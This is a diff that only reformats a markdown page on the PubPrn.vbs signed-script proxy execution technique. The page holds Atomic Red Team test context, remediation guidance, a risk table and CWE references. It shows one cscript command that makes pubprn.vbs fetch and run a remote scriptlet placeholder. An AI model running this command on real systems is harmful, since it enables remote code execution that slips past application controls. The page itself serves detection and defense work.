@@ -73,7 +73,6 @@ Executes the signed PubPrn.vbs script with options to download and execute an ar
 cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost "script:#{remote_payload}"
 ```
 
-
 ### Manual Testing
 
 If Atomic Red Team tests are not applicable, manually verify the technique by:
@@ -87,29 +86,28 @@ If Atomic Red Team tests are not applicable, manually verify the technique by:
 ## Remediation Guide
 
 ### M1038 Execution Prevention
+
 Certain signed scripts that can be used to execute other programs may not be necessary within a given environment. Use application control configured to block execution of these scripts if they are not required for a given system or network to prevent potential misuse by adversaries.
 
 ### M1040 Behavior Prevention on Endpoint
-On Windows 10, update Windows Defender Application Control policies to include rules that block the older, vulnerable versions of PubPrn.
 
+On Windows 10, update Windows Defender Application Control policies to include rules that block the older, vulnerable versions of PubPrn.
 
 ## Detection
 
 ### Detecting Remote Script Proxy Execution via PubPrn.vbs
 
-
 ## Risk Assessment
 
-| Finding | Severity | Impact |
-| ------- | -------- | ------ |
-| PubPrn technique applicable | Medium | Defense Evasion |
+| Finding                     | Severity | Impact          |
+| --------------------------- | -------- | --------------- |
+| PubPrn technique applicable | Medium   | Defense Evasion |
 
 ## CWE Categories
 
-| CWE ID | Title |
-| ------ | ----- |
+| CWE ID  | Title                        |
+| ------- | ---------------------------- |
 | CWE-693 | Protection Mechanism Failure |
-
 
 ## References
 
